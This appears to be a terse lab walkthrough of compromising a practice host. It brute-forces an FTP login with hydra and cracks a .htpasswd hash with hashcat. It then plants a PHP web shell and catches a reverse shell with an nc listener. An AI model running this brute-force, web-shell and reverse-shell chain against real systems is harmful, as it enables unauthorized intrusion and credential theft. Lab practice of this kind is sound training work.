# 4 :21 ftp admin

```
# brute forcing ftp access

$ hydra -L users -P /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 192.168.191.46 ftp -V -f
[21][ftp] host: 192.168.191.46   login: admin   password: admin

# admin:admin works
$ ftp 192.168.191.46
Connected to 192.168.191.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name (192.168.191.46:kashz): admin
331 User name received, need password.
Password:
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT Command successful.
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.

$ cat index.php
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>                                                                                                                                                                     

$ cat .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0

$ cat .htaccess
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>

$ hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt --show
$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0:elite

# wappalyuzer shows its a PHP server
# we have admin user on ftp and can write files
# putting web shell on it.

CMD: whoami && whoami /priv
livda\apache

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

echo %PATH%
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem 

# possibly no powershell
# using php-reverse shell

$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [192.168.49.191] from (UNKNOWN) [192.168.191.46] 49177
SOCKET: Shell has connected! PID: 1268
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>whoami
livda\apache
```
